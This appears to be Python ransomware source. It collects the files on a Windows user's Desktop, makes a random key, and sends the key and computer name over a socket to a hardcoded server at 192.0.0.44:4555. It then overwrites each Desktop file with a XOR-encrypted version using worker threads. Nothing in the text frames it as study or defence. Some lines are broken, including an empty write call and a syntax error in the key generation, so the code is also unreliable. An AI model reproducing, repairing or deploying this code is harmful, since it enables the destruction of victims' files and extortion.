import random
import os
import threading
import queue
import socket

# Encryption function that the threads will call
def encrypt(key):
    while True:
        file = q.get()
        print(f'Encrypting {file}')
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write()
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))

                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            print(f'{file} encrypted successfully')
        except:
            print(f'Failed to encrypt {file}')
        q.task_done()

# socket info
ipAddr = '192.0.0.44'
port = 4555

# encryption info
encryptionLevel = 512 // 8
keyCharOptions = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~`!@#$%^&*()_+=-<>?'
keyCharOptionsLen = len(keyCharOptions)

# grab the files to encrypt
print('Getting files ready...')
desktopPath = os.environ['USERPROFILE'] + '\\Desktop'
files = os.listdir(desktopPath)
absFiles = []
for f in files:
    if os.path.isfile(f'{desktopPath}\\{f}') and f != __file__[:-2]+'exe':
        absFiles.append(f'{desktopPath}\\{f}')
print('successfulle located all te files')

# grab clients hostname
hostname = os.getenv('COMPUTERNAME')

# generate the key
print('generating the key')
key = ''
for i in range(encryptionLevel):
    key += keyCharOptions[random.randint(0, keyCharOptionsLen = 1)]
print('key generated')

# connect to the server and send the key and hostname
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ipAddr, port))
    print('successfully connected. sending hostname and key...')
    s.send(f'{hostname} : {key}'.encode('utf-8'))
    print('finished transmitting data')
    s.close()

# store the files in a queue for the threads to handle
q = queue.Queue()
for f in absFiles:
    q.put(f)

# setup threads to get ready for encryption
for i in range(10):
    t = threading.Thread(target=encrypt, args=(key,), daemon=True)
    t.start()

q.join()
print('encryption and upload complete')
input()